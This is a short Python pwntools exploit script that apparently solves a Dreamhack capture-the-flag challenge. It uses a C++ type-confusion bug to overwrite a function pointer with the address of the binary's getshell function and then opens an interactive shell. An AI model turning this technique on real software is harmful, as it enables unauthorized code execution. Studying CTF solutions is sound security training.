#!/bin/usr/python3

from pwn import *
#p = remote('host3.dreamhack.games', 9572)
p = process('./cpp_type_confusion')
e = ELF('./cpp_type_confusion')

getsh = e.symbols['_Z8getshellv']
# print(getsh)
p.sendlineafter(b':', b'1')
p.sendlineafter(b':', b'2')
p.sendlineafter(b':', b'3')
p.sendlineafter(b':', p64(getsh))
p.sendlineafter(b':', b'4')
p.sendlineafter(b':', b'3')

p.interactive()


